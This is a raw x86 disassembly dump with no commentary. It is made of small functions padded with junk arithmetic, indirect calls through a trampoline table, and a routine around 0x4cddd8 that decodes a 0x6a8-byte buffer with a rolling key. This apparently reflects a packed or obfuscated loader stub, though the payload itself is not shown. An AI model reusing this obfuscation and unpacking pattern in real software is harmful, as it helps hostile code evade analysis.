  4cd8f6:	pop    edx
  4cd8f7:	add    esp,0x2c
  4cd8fa:	pop    ebp
  4cd8fb:	ret    
  4cd8fc:	pop    edi
  4cd8fd:	xor    eax,eax
  4cd8ff:	call   DWORD PTR [eax*8+0x4cf6f4]
  4cd906:	push   edi
  4cd907:	pop    edi
  4cd908:	jmp    DWORD PTR [esp-0x4]
  4cd90c:	mov    edi,edi
  4cd90e:	push   ebp
  4cd90f:	mov    ebp,esp
  4cd911:	sub    esp,0x58
  4cd914:	lea    eax,ds:0x4d0070
  4cd91a:	sub    ecx,esi
  4cd91c:	push   eax
  4cd91d:	lea    ebx,[eax-0x70]
  4cd920:	push   ebx
  4cd921:	call   0x4cdb90
  4cd926:	test   eax,eax
  4cd928:	jne    0x4cd91d
  4cd92a:	pop    eax
  4cd92b:	push   eax
  4cd92c:	push   edi
  4cd92d:	push   DWORD PTR [eax]
  4cd92f:	call   0x4cd3e8
  4cd934:	add    esp,0x8
  4cd937:	pop    eax
  4cd938:	push   eax
  4cd939:	mov    edx,0x0
  4cd93e:	push   edx
  4cd93f:	call   0x4cd8fc
  4cd944:	pop    eax
  4cd945:	add    esp,0x58
  4cd948:	pop    ebp
  4cd949:	ret    
  4cd94a:	add    BYTE PTR [eax],al
  4cd94c:	mov    edi,edi
  4cd94e:	push   ebp
  4cd94f:	mov    ebp,esp
  4cd951:	sub    esp,0x54
  4cd954:	lea    eax,[esi-0x140]
  4cd95a:	or     edi,DWORD PTR [ebp-0x10]
  4cd95d:	push   eax
  4cd95e:	push   DWORD PTR [eax+0x120]
  4cd964:	push   DWORD PTR [eax+0x5c]
  4cd967:	push   edi
  4cd968:	call   0x4cd304
  4cd96d:	add    esp,0xc
  4cd970:	pop    eax
  4cd971:	push   eax
  4cd972:	mov    eax,0x0
  4cd977:	push   eax
  4cd978:	call   0x4cd8fc
  4cd97d:	pop    eax
  4cd97e:	push   eax
  4cd97f:	push   0x0
  4cd981:	call   0x4cd838
  4cd986:	pop    eax
  4cd987:	add    esp,0x54
  4cd98a:	pop    ebp
  4cd98b:	ret    
  4cd98c:	pop    edi
  4cd98d:	xor    eax,eax
  4cd98f:	call   DWORD PTR [eax*8+0x4cf6fc]
  4cd996:	push   edi
  4cd997:	pop    edi
  4cd998:	jmp    DWORD PTR [esp-0x4]
  4cd99c:	pop    edi
  4cd99d:	xor    eax,eax
  4cd99f:	call   DWORD PTR [eax*8+0x4cf768]
  4cd9a6:	push   edi
  4cd9a7:	pop    edi
  4cd9a8:	jmp    DWORD PTR [esp-0x4]
  4cd9ac:	mov    edi,edi
  4cd9ae:	push   ebp
  4cd9af:	mov    ebp,esp
  4cd9b1:	sub    esp,0x24
  4cd9b4:	mov    eax,0x4d01ec
  4cd9b9:	adc    ebx,edx
  4cd9bb:	push   eax
  4cd9bc:	push   ebx
  4cd9bd:	push   esi
  4cd9be:	call   0x4cdc30
  4cd9c3:	add    esp,0x8
  4cd9c6:	pop    eax
  4cd9c7:	push   eax
  4cd9c8:	call   0x4cd394
  4cd9cd:	pop    eax
  4cd9ce:	push   eax
  4cd9cf:	push   0x0
  4cd9d1:	call   0x4cdba0
  4cd9d6:	pop    eax
  4cd9d7:	add    esp,0x24
  4cd9da:	pop    ebp
  4cd9db:	ret    
  4cd9dc:	mov    edi,edi
  4cd9de:	push   ebp
  4cd9df:	mov    ebp,esp
  4cd9e1:	sub    esp,0x50
  4cd9e4:	mov    edi,0x4d01c4
  4cd9e9:	or     DWORD PTR [ebp-0x48],0x6d
  4cd9ed:	push   edi
  4cd9ee:	push   ecx
  4cd9ef:	push   eax
  4cd9f0:	push   DWORD PTR [edi+0xf0]
  4cd9f6:	call   0x4ce07c
  4cd9fb:	add    esp,0xc
  4cd9fe:	pop    edi
  4cd9ff:	push   edi
  4cda00:	push   0x0
  4cda02:	call   0x4cd98c
  4cda07:	pop    edi
  4cda08:	push   edi
  4cda09:	push   0x0
  4cda0b:	call   0x4cd0f0
  4cda10:	pop    edi
  4cda11:	add    esp,0x50
  4cda14:	pop    ebp
  4cda15:	ret    
  4cda16:	add    BYTE PTR [eax],al
  4cda18:	mov    edi,edi
  4cda1a:	push   ebp
  4cda1b:	mov    ebp,esp
  4cda1d:	sub    esp,0x20
  4cda20:	mov    ebx,0x4d01b4
  4cda25:	adc    eax,DWORD PTR [ebx+0xc]
  4cda28:	lea    edx,[ebx-0x1b4]
  4cda2e:	push   edx
  4cda2f:	call   0x4cdb90
  4cda34:	test   eax,eax
  4cda36:	jne    0x4cda29
  4cda38:	push   ebx
  4cda39:	push   DWORD PTR [ebx+0xb4]
  4cda3f:	push   DWORD PTR [ebx+0x11c]
  4cda45:	call   0x4cd144
  4cda4a:	add    esp,0x8
  4cda4d:	pop    ebx
  4cda4e:	push   0x0
  4cda50:	call   0x4cddb8
  4cda55:	add    esp,0x20
  4cda58:	pop    ebp
  4cda59:	ret    
  4cda5a:	add    BYTE PTR [eax],al
  4cda5c:	mov    edi,edi
  4cda5e:	push   ebp
  4cda5f:	mov    ebp,esp
  4cda61:	sub    esp,0x28
  4cda64:	mov    ecx,0x4d01d8
  4cda69:	or     ebx,eax
  4cda6b:	push   ecx
  4cda6c:	push   DWORD PTR [ecx+0xa0]
  4cda72:	push   DWORD PTR [ecx+0x8]
  4cda75:	push   eax
  4cda76:	push   DWORD PTR [ecx+0x88]
  4cda7c:	call   0x4cd7f8
  4cda81:	add    esp,0x10
  4cda84:	pop    ecx
  4cda85:	push   ecx
  4cda86:	mov    ecx,0x0
  4cda8b:	push   ecx
  4cda8c:	call   0x4cd0f0
  4cda91:	pop    ecx
  4cda92:	push   ecx
  4cda93:	push   0x0
  4cda95:	call   0x4cd838
  4cda9a:	pop    ecx
  4cda9b:	add    esp,0x28
  4cda9e:	pop    ebp
  4cda9f:	ret    
  4cdaa0:	mov    edi,edi
  4cdaa2:	push   ebp
  4cdaa3:	mov    ebp,esp
  4cdaa5:	sub    esp,0x1c
  4cdaa8:	mov    ecx,0x4d0168
  4cdaad:	sub    DWORD PTR [ecx-0x48],ebx
  4cdab0:	push   ecx
  4cdab1:	mov    esi,0x0
  4cdab6:	push   esi
  4cdab7:	call   0x4cd0f0
  4cdabc:	pop    ecx
  4cdabd:	push   ecx
  4cdabe:	push   eax
  4cdabf:	push   edi
  4cdac0:	push   esi
  4cdac1:	call   0x4cd1d4
  4cdac6:	add    esp,0xc
  4cdac9:	pop    ecx
  4cdaca:	push   ecx
  4cdacb:	mov    edx,0x0
  4cdad0:	push   edx
  4cdad1:	call   0x4cdba0
  4cdad6:	pop    ecx
  4cdad7:	add    esp,0x1c
  4cdada:	pop    ebp
  4cdadb:	ret    
  4cdadc:	pop    edi
  4cdadd:	xor    eax,eax
  4cdadf:	call   DWORD PTR [eax*8+0x4cf770]
  4cdae6:	push   edi
  4cdae7:	pop    edi
  4cdae8:	jmp    DWORD PTR [esp-0x4]
  4cdaec:	pop    edi
  4cdaed:	xor    eax,eax
  4cdaef:	call   DWORD PTR [eax*8+0x4cf758]
  4cdaf6:	push   edi
  4cdaf7:	pop    edi
  4cdaf8:	jmp    DWORD PTR [esp-0x4]
  4cdafc:	mov    edi,edi
  4cdafe:	push   ebp
  4cdaff:	mov    ebp,esp
  4cdb01:	sub    esp,0x5c
  4cdb04:	lea    esi,ds:0x4d014c
  4cdb0a:	adc    DWORD PTR [ebp-0x20],edi
  4cdb0d:	push   esi
  4cdb0e:	push   edi
  4cdb0f:	push   ebx
  4cdb10:	push   DWORD PTR [esi+0x2c]
  4cdb13:	push   DWORD PTR [esi+0x134]
  4cdb19:	call   0x4cd6dc
  4cdb1e:	add    esp,0x10
  4cdb21:	pop    esi
  4cdb22:	mov    ecx,0x0
  4cdb27:	push   ecx
  4cdb28:	call   0x4cd8fc
  4cdb2d:	mov    edx,0x0
  4cdb32:	push   edx
  4cdb33:	call   0x4cddb8
  4cdb38:	add    esp,0x5c
  4cdb3b:	pop    ebp
  4cdb3c:	ret    
  4cdb3d:	add    BYTE PTR [eax],al
  4cdb3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdb45:	sub    esp,0x3c
  4cdb48:	lea    esi,[ecx+0x50]
  4cdb4b:	sbb    edi,ebx
  4cdb4d:	push   0x0
  4cdb4f:	call   0x4cd0f0
  4cdb54:	push   esi
  4cdb55:	push   DWORD PTR [esi+0x164]
  4cdb5b:	push   DWORD PTR [esi+0xe0]
  4cdb61:	push   DWORD PTR [esi+0x19c]
  4cdb67:	push   ebx
  4cdb68:	call   0x4cdc6c
  4cdb6d:	add    esp,0x10
  4cdb70:	pop    esi
  4cdb71:	push   0x0
  4cdb73:	call   0x4cd98c
  4cdb78:	add    esp,0x3c
  4cdb7b:	pop    ebp
  4cdb7c:	ret    
  4cdb7d:	add    BYTE PTR [eax],al
  4cdb7f:	add    BYTE PTR [edi+0x33],bl
  4cdb82:	sar    bh,0x14
  4cdb85:	lds    eax,FWORD PTR [eax+0x57004cf7]
  4cdb8b:	pop    edi
  4cdb8c:	jmp    DWORD PTR [esp-0x4]
  4cdb90:	pop    edi
  4cdb91:	xor    eax,eax
  4cdb93:	call   DWORD PTR [eax*8+0x4cf6f0]
  4cdb9a:	push   edi
  4cdb9b:	pop    edi
  4cdb9c:	jmp    DWORD PTR [esp-0x4]
  4cdba0:	pop    edi
  4cdba1:	xor    eax,eax
  4cdba3:	call   DWORD PTR [eax*8+0x4cf73c]
  4cdbaa:	push   edi
  4cdbab:	pop    edi
  4cdbac:	jmp    DWORD PTR [esp-0x4]
  4cdbb0:	mov    edi,edi
  4cdbb2:	push   ebp
  4cdbb3:	mov    ebp,esp
  4cdbb5:	sub    esp,0x44
  4cdbb8:	lea    esi,[ebx-0x138]
  4cdbbe:	mov    DWORD PTR [esi+0x1ac],0xffffffb1
  4cdbc8:	call   0x4cd394
  4cdbcd:	push   esi
  4cdbce:	push   edx
  4cdbcf:	push   edx
  4cdbd0:	push   edx
  4cdbd1:	call   0x4cdf5c
  4cdbd6:	add    esp,0xc
  4cdbd9:	pop    esi
  4cdbda:	mov    eax,0x0
  4cdbdf:	push   eax
  4cdbe0:	call   0x4cddb8
  4cdbe5:	add    esp,0x44
  4cdbe8:	pop    ebp
  4cdbe9:	ret    
  4cdbea:	add    BYTE PTR [eax],al
  4cdbec:	mov    edi,edi
  4cdbee:	push   ebp
  4cdbef:	mov    ebp,esp
  4cdbf1:	sub    esp,0x38
  4cdbf4:	mov    eax,0x4d001c
  4cdbf9:	cmp    eax,0x54d0
  4cdbfe:	jbe    0x4cdbef
  4cdc00:	push   eax
  4cdc01:	push   esi
  4cdc02:	push   DWORD PTR [eax+0x74]
  4cdc05:	push   DWORD PTR [eax+0x1e8]
  4cdc0b:	call   0x4cd5e0
  4cdc10:	add    esp,0xc
  4cdc13:	pop    eax
  4cdc14:	push   eax
  4cdc15:	mov    ebx,0x0
  4cdc1a:	push   ebx
  4cdc1b:	call   0x4cd0f0
  4cdc20:	pop    eax
  4cdc21:	push   eax
  4cdc22:	push   0x0
  4cdc24:	call   0x4cd4c8
  4cdc29:	pop    eax
  4cdc2a:	add    esp,0x38
  4cdc2d:	pop    ebp
  4cdc2e:	ret    
  4cdc2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdc35:	sub    esp,0x38
  4cdc38:	mov    edx,0x4d01f0
  4cdc3d:	add    DWORD PTR [ebp-0x14],0xffff9184
  4cdc44:	push   edx
  4cdc45:	push   0x0
  4cdc47:	call   0x4cd4c8
  4cdc4c:	pop    edx
  4cdc4d:	push   edx
  4cdc4e:	push   eax
  4cdc4f:	push   eax
  4cdc50:	push   eax
  4cdc51:	push   DWORD PTR [edx+0x17c]
  4cdc57:	call   0x4cd190
  4cdc5c:	add    esp,0x10
  4cdc5f:	pop    edx
  4cdc60:	push   edx
  4cdc61:	call   0x4cd394
  4cdc66:	pop    edx
  4cdc67:	add    esp,0x38
  4cdc6a:	pop    ebp
  4cdc6b:	ret    
  4cdc6c:	mov    edi,edi
  4cdc6e:	push   ebp
  4cdc6f:	mov    ebp,esp
  4cdc71:	sub    esp,0x40
  4cdc74:	lea    edx,ds:0x4d01fc
  4cdc7a:	adc    eax,DWORD PTR [ebp-0x8]
  4cdc7d:	push   edx
  4cdc7e:	push   DWORD PTR [edx+0x1bc]
  4cdc84:	push   eax
  4cdc85:	push   ecx
  4cdc86:	call   0x4cd354
  4cdc8b:	add    esp,0xc
  4cdc8e:	pop    edx
  4cdc8f:	push   edx
  4cdc90:	mov    ecx,0x0
  4cdc95:	push   ecx
  4cdc96:	call   0x4cd344
  4cdc9b:	pop    edx
  4cdc9c:	push   edx
  4cdc9d:	mov    ebx,0x0
  4cdca2:	push   ebx
  4cdca3:	call   0x4cdba0
  4cdca8:	pop    edx
  4cdca9:	add    esp,0x40
  4cdcac:	pop    ebp
  4cdcad:	ret    
  4cdcae:	add    BYTE PTR [eax],al
  4cdcb0:	pop    edi
  4cdcb1:	xor    eax,eax
  4cdcb3:	call   DWORD PTR [eax*8+0x4cf77c]
  4cdcba:	push   edi
  4cdcbb:	pop    edi
  4cdcbc:	jmp    DWORD PTR [esp-0x4]
  4cdcc0:	pop    edi
  4cdcc1:	xor    eax,eax
  4cdcc3:	call   DWORD PTR [eax*8+0x4cf70c]
  4cdcca:	push   edi
  4cdccb:	pop    edi
  4cdccc:	jmp    DWORD PTR [esp-0x4]
  4cdcd0:	pop    edi
  4cdcd1:	xor    eax,eax
  4cdcd3:	call   DWORD PTR [eax*8+0x4cf764]
  4cdcda:	push   edi
  4cdcdb:	pop    edi
  4cdcdc:	jmp    DWORD PTR [esp-0x4]
  4cdce0:	pop    edi
  4cdce1:	xor    eax,eax
  4cdce3:	call   DWORD PTR [eax*8+0x4cf734]
  4cdcea:	push   edi
  4cdceb:	pop    edi
  4cdcec:	jmp    DWORD PTR [esp-0x4]
  4cdcf0:	pop    edi
  4cdcf1:	xor    eax,eax
  4cdcf3:	call   DWORD PTR [eax*8+0x4cf700]
  4cdcfa:	push   edi
  4cdcfb:	pop    edi
  4cdcfc:	jmp    DWORD PTR [esp-0x4]
  4cdd00:	mov    edi,edi
  4cdd02:	push   ebp
  4cdd03:	mov    ebp,esp
  4cdd05:	sub    esp,0x44
  4cdd08:	mov    edx,0x4d006c
  4cdd0d:	cmp    edx,0x3a2
  4cdd13:	je     0x4cdd03
  4cdd15:	push   edx
  4cdd16:	push   DWORD PTR [edx+0x64]
  4cdd19:	push   ebx
  4cdd1a:	push   DWORD PTR [edx+0x90]
  4cdd20:	push   ebx
  4cdd21:	call   0x4ce03c
  4cdd26:	add    esp,0x10
  4cdd29:	pop    edx
  4cdd2a:	push   edx
  4cdd2b:	mov    esi,0xfffffff4
  4cdd30:	push   esi
  4cdd31:	call   0x4cddc8
  4cdd36:	pop    edx
  4cdd37:	push   edx
  4cdd38:	push   0x0
  4cdd3a:	call   0x4cdf3c
  4cdd3f:	pop    edx
  4cdd40:	add    esp,0x44
  4cdd43:	pop    ebp
  4cdd44:	ret    
  4cdd45:	add    BYTE PTR [eax],al
  4cdd47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdd4d:	sub    esp,0x20
  4cdd50:	lea    ebx,ds:0x4d0034
  4cdd56:	xor    DWORD PTR [ebx+0x70],edx
  4cdd59:	call   0x4cdcc0
  4cdd5e:	push   ebx
  4cdd5f:	push   DWORD PTR [ebx+0x94]
  4cdd65:	push   DWORD PTR [ebx+0x1c8]
  4cdd6b:	push   DWORD PTR [ebx+0x158]
  4cdd71:	push   eax
  4cdd72:	call   0x4cd88c
  4cdd77:	add    esp,0x10
  4cdd7a:	pop    ebx
  4cdd7b:	push   0x0
  4cdd7d:	call   0x4cd8fc
  4cdd82:	add    esp,0x20
  4cdd85:	pop    ebp
  4cdd86:	ret    
  4cdd87:	add    BYTE PTR [edi+0x33],bl
  4cdd8a:	sar    bh,0x14
  4cdd8d:	lds    eax,FWORD PTR [eax-0x9]
  4cdd90:	dec    esp
  4cdd91:	add    BYTE PTR [edi+0x5f],dl
  4cdd94:	jmp    DWORD PTR [esp-0x4]
  4cdd98:	pop    edi
  4cdd99:	xor    eax,eax
  4cdd9b:	call   DWORD PTR [eax*8+0x4cf714]
  4cdda2:	push   edi
  4cdda3:	pop    edi
  4cdda4:	jmp    DWORD PTR [esp-0x4]
  4cdda8:	pop    edi
  4cdda9:	xor    eax,eax
  4cddab:	call   DWORD PTR [eax*8+0x4cf760]
  4cddb2:	push   edi
  4cddb3:	pop    edi
  4cddb4:	jmp    DWORD PTR [esp-0x4]
  4cddb8:	pop    edi
  4cddb9:	xor    eax,eax
  4cddbb:	call   DWORD PTR [eax*8+0x4cf704]
  4cddc2:	push   edi
  4cddc3:	pop    edi
  4cddc4:	jmp    DWORD PTR [esp-0x4]
  4cddc8:	pop    edi
  4cddc9:	xor    eax,eax
  4cddcb:	call   DWORD PTR [eax*8+0x4cf710]
  4cddd2:	push   edi
  4cddd3:	pop    edi
  4cddd4:	jmp    DWORD PTR [esp-0x4]
  4cddd8:	mov    edi,edi
  4cddda:	push   ebp
  4cdddb:	mov    ebp,esp
  4cdddd:	sub    esp,0x44
  4cdde0:	xor    DWORD PTR [ebp-0x24],0x110f
  4cdde7:	mov    edi,0x4d0158
  4cddec:	push   edi
  4cdded:	push   0x6a8
  4cddf2:	mov    ecx,0x6a8
  4cddf7:	push   ecx
  4cddf8:	mov    eax,0x40001
  4cddfd:	push   eax
  4cddfe:	mov    edi,0x86295c9a
  4cde03:	push   DWORD PTR [edi+0x7a239a86]
  4cde09:	sub    DWORD PTR [esp],0x2
  4cde0d:	mov    edi,0x4cf728
  4cde12:	pop    DWORD PTR [edi]
  4cde14:	call   0x4cd418
  4cde19:	xchg   DWORD PTR [esp],eax
  4cde1c:	mov    edi,eax
  4cde1e:	pop    DWORD PTR [edi-0x58]
  4cde21:	mov    ecx,DWORD PTR [edi-0x58]
  4cde24:	mov    ecx,ecx
  4cde26:	sub    esi,esi
  4cde28:	dec    esi
  4cde29:	and    esi,0x4cf038
  4cde2f:	mov    edx,0x631a7e54
  4cde34:	xor    ebx,ebx
  4cde36:	add    ebx,0x6a8
  4cde3c:	xor    eax,eax
  4cde3e:	push   DWORD PTR [esi+eax*1]
  4cde41:	sub    DWORD PTR [esp],edx
  4cde44:	pop    DWORD PTR [ecx+eax*2]
  4cde47:	dec    DWORD PTR [ecx]
  4cde49:	xor    edx,edx
  4cde4b:	add    edx,DWORD PTR [esi]
  4cde4d:	add    esi,0x4
  4cde50:	add    ecx,0x4
  4cde53:	sub    ebx,0x4
  4cde56:	cmp    ebx,0x0
  4cde59:	jne    0x4cde3c
  4cde5b:	push   edi
  4cde5c:	call   0x4ce01c
  4cde61:	pop    edi
  4cde62:	add    esp,0x44
  4cde65:	pop    ebp
  4cde66:	ret    
  4cde67:	add    BYTE PTR [edi+0x33],bl
  4cde6a:	sar    bh,0x14
  4cde6d:	lds    ebp,FWORD PTR [edi+esi*8+0x4c]
  4cde71:	add    BYTE PTR [edi+0x5f],dl
  4cde74:	jmp    DWORD PTR [esp-0x4]
  4cde78:	mov    edi,edi
  4cde7a:	push   ebp
  4cde7b:	mov    ebp,esp
  4cde7d:	sub    esp,0x4c
  4cde80:	lea    edx,[esi-0xd8]
  4cde86:	xor    esi,0xffff898b
  4cde8c:	push   edx
  4cde8d:	push   DWORD PTR [edx+0x50]
  4cde90:	push   DWORD PTR [edx+0x54]
  4cde93:	push   DWORD PTR [edx+0xf4]
  4cde99:	call   0x4cd614
  4cde9e:	add    esp,0xc
  4cdea1:	pop    edx
  4cdea2:	push   edx
  4cdea3:	call   0x4cdd98
  4cdea8:	pop    edx
  4cdea9:	push   edx
  4cdeaa:	mov    edx,0x0
  4cdeaf:	push   edx
  4cdeb0:	call   0x4cd838
  4cdeb5:	pop    edx
  4cdeb6:	add    esp,0x4c
  4cdeb9:	pop    ebp
  4cdeba:	ret    
  4cdebb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdec1:	sub    esp,0x40
  4cdec4:	lea    ebx,[eax+0x8]
  4cdec7:	adc    esi,DWORD PTR [ebx-0x98]
  4cdecd:	push   0x0
  4cdecf:	call   0x4cdf3c
  4cded4:	push   ebx
  4cded5:	push   DWORD PTR [ebx+0xfc]
  4cdedb:	push   DWORD PTR [ebx+0x14c]
  4cdee1:	call   0x4cd7b0
  4cdee6:	add    esp,0x8
  4cdee9:	pop    ebx
  4cdeea:	push   0x0
  4cdeec:	call   0x4cd344
  4cdef1:	add    esp,0x40
  4cdef4:	pop    ebp
  4cdef5:	ret    
  4cdef6:	add    BYTE PTR [eax],al
  4cdef8:	mov    edi,edi
  4cdefa:	push   ebp
  4cdefb:	mov    ebp,esp
  4cdefd:	sub    esp,0x24
  4cdf00:	mov    edx,0x4d0060
  4cdf05:	and    ecx,DWORD PTR [edx+0x134]
  4cdf0b:	push   edx
  4cdf0c:	push   0x0
  4cdf0e:	call   0x4cdf3c
  4cdf13:	pop    edx
  4cdf14:	push   edx
  4cdf15:	push   ecx
  4cdf16:	push   esi
  4cdf17:	push   DWORD PTR [edx+0x110]
  4cdf1d:	push   DWORD PTR [edx+0x164]
  4cdf23:	call   0x4cd90c
  4cdf28:	add    esp,0x10
  4cdf2b:	pop    edx
  4cdf2c:	push   edx
  4cdf2d:	push   0x0
  4cdf2f:	call   0x4cdba0
  4cdf34:	pop    edx
  4cdf35:	add    esp,0x24
  4cdf38:	pop    ebp
  4cdf39:	ret    
  4cdf3a:	add    BYTE PTR [eax],al
  4cdf3c:	pop    edi
  4cdf3d:	xor    eax,eax
  4cdf3f:	call   DWORD PTR [eax*8+0x4cf71c]
  4cdf46:	push   edi
  4cdf47:	pop    edi
  4cdf48:	jmp    DWORD PTR [esp-0x4]
  4cdf4c:	pop    edi
  4cdf4d:	xor    eax,eax
  4cdf4f:	call   DWORD PTR [eax*8+0x4cf724]
  4cdf56:	push   edi
  4cdf57:	pop    edi
  4cdf58:	jmp    DWORD PTR [esp-0x4]
  4cdf5c:	mov    edi,edi
  4cdf5e:	push   ebp
  4cdf5f:	mov    ebp,esp
  4cdf61:	sub    esp,0x20
  4cdf64:	mov    edx,0x4d01b0
  4cdf69:	or     esi,DWORD PTR [edx-0xbc]
  4cdf6f:	push   edx
  4cdf70:	call   0x4cdcc0
  4cdf75:	pop    edx
  4cdf76:	push   edx
  4cdf77:	push   edi
  4cdf78:	push   DWORD PTR [edx+0x130]
  4cdf7e:	call   0x4cdafc
  4cdf83:	add    esp,0x8
  4cdf86:	pop    edx
  4cdf87:	push   edx
  4cdf88:	mov    esi,0x0
  4cdf8d:	push   esi
  4cdf8e:	call   0x4cdf3c
  4cdf93:	pop    edx
  4cdf94:	add    esp,0x20
  4cdf97:	pop    ebp
  4cdf98:	ret    
  4cdf99:	add    BYTE PTR [eax],al
  4cdf9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdfa1:	sub    esp,0x24
  4cdfa4:	mov    ebx,0x4d010c
  4cdfa9:	cmp    ebx,0x75ab
  4cdfaf:	je     0x4cdf9f
  4cdfb1:	push   ebx
  4cdfb2:	push   DWORD PTR [ebx+0x1e4]
  4cdfb8:	push   edx
  4cdfb9:	push   edx
  4cdfba:	call   0x4cd720
  4cdfbf:	add    esp,0xc
  4cdfc2:	pop    ebx
  4cdfc3:	call   0x4cdd98
  4cdfc8:	mov    edx,0xfffffff4
  4cdfcd:	push   edx
  4cdfce:	call   0x4cddc8
  4cdfd3:	add    esp,0x24
  4cdfd6:	pop    ebp
  4cdfd7:	ret    
  4cdfd8:	pop    edi
  4cdfd9:	xor    eax,eax
  4cdfdb:	call   DWORD PTR [eax*8+0x4cf784]
  4cdfe2:	push   edi
  4cdfe3:	pop    edi
  4cdfe4:	jmp    DWORD PTR [esp-0x4]
  4cdfe8:	mov    edi,edi
  4cdfea:	push   ebp
  4cdfeb:	mov    ebp,esp
  4cdfed:	sub    esp,0x34
  4cdff0:	lea    edi,[ecx-0x28]
  4cdff3:	or     eax,0x2944
  4cdff8:	push   edi
  4cdff9:	push   0x0
  4cdffb:	call   0x4cdba0
  4ce000:	pop    edi
  4ce001:	push   edi
  4ce002:	push   ecx
  4ce003:	push   edx
  4ce004:	call   0x4cdaa0
  4ce009:	add    esp,0x8
  4ce00c:	pop    edi
  4ce00d:	push   edi
  4ce00e:	call   0x4ce01c
  4ce013:	pop    edi
  4ce014:	add    esp,0x34
  4ce017:	pop    ebp
  4ce018:	ret    
  4ce019:	add    BYTE PTR [eax],al
  4ce01b:	add    BYTE PTR [edi+0x33],bl
  4ce01e:	sar    bh,0x14
  4ce021:	lds    ecx,FWORD PTR [eax]
  4ce023:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4ce02b:	cld    
  4ce02c:	pop    edi
  4ce02d:	xor    eax,eax
  4ce02f:	call   DWORD PTR [eax*8+0x4cf778]
  4ce036:	push   edi
  4ce037:	pop    edi
  4ce038:	jmp    DWORD PTR [esp-0x4]
  4ce03c:	mov    edi,edi
  4ce03e:	push   ebp
  4ce03f:	mov    ebp,esp
  4ce041:	sub    esp,0x48
  4ce044:	lea    eax,[edx+0x14]
  4ce047:	sub    ecx,DWORD PTR [ebp-0x40]
  4ce04a:	push   eax
  4ce04b:	push   DWORD PTR [eax+0xd0]
  4ce051:	push   edx
  4ce052:	call   0x4cd3a4
  4ce057:	add    esp,0x8
  4ce05a:	pop    eax
  4ce05b:	push   eax
  4ce05c:	lea    eax,[eax-0x80]
  4ce062:	push   eax
  4ce063:	call   0x4cdb90
  4ce068:	test   eax,eax
  4ce06a:	jne    0x4ce05c
  4ce06c:	pop    eax
  4ce06d:	push   eax
  4ce06e:	call   0x4cdd98
  4ce073:	pop    eax
  4ce074:	add    esp,0x48
  4ce077:	pop    ebp
  4ce078:	ret    
  4ce079:	add    BYTE PTR [eax],al
  4ce07b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4ce081:	sub    esp,0x58
  4ce084:	lea    esi,[edi-0x138]
  4ce08a:	mov    eax,DWORD PTR [esi-0x6c]
  4ce08d:	push   0x0
  4ce08f:	call   0x4cd4c8
  4ce094:	push   esi
  4ce095:	push   eax
  4ce096:	push   ecx
  4ce097:	call   0x4cd100
  4ce09c:	add    esp,0x8
  4ce09f:	pop    esi
  4ce0a0:	push   0x0
  4ce0a2:	call   0x4cd98c
  4ce0a7:	add    esp,0x58
  4ce0aa:	pop    ebp
  4ce0ab:	ret    
  4ce0ac:	pop    edi
  4ce0ad:	xor    eax,eax
  4ce0af:	call   DWORD PTR [eax*8+0x4cf74c]
  4ce0b6:	push   edi
  4ce0b7:	pop    edi
  4ce0b8:	jmp    DWORD PTR [esp-0x4]
